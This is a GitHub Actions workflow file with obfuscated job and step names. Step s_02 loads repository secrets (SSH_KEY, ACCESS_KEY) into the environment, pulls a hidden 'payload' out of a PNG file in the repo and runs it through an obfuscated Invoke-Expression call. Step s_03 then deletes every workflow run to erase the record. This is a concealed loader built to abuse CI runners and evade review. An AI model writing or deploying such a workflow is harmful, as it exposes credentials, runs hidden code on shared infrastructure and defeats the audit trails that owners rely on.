name: r4dx

on:
  workflow_dispatch:

jobs:
  j_712:
    runs-on: windows-2022
    timeout-minutes: 360
    permissions:
      actions: write
      contents: read

    steps:
      - name: s_01
        uses: actions/checkout@v4

      - name: s_02 (Extract & Execute from Local Image)
        shell: powershell
        env:
          SSH_KEY: ${{ secrets.SSH_KEY }}
          A_KEY: ${{ secrets.ACCESS_KEY }}
        run: |
          $imgPath = Join-Path $pwd "BondeXJS.png"
          
          if (Test-Path $imgPath) {
              Write-Host "[*] Reading payload from $imgPath..." -ForegroundColor Cyan
              
              $content = Get-Content $imgPath -Raw -Encoding utf8
              $marker = "# ========================================================="
              $startIndex = $content.IndexOf($marker)
              if ($startIndex -ge 0) {
                  $payload = $content.Substring($startIndex)
                  Write-Host "[+] Payload extracted. Launching Ghost Engine..." -ForegroundColor Green
                  $e = "I" + "E" + "X"
                  & $e ($payload)
              } else {
                  Write-Host "[-] Error: Marker skrip tidak ditemukan dalam gambar!" -ForegroundColor Red
                  exit 1
              }
          } else {
              Write-Host "[-] Error: File BondeXJS.png tidak ditemukan di root repo." -ForegroundColor Red
              exit 1
          }
          
      - name: s_03
        uses: Mattraks/delete-workflow-runs@v2
        if: always()
        with:
          token: ${{ github.token }}
          repository: ${{ github.repository }}
          retain_days: 0
          keep_minimum_runs: 0
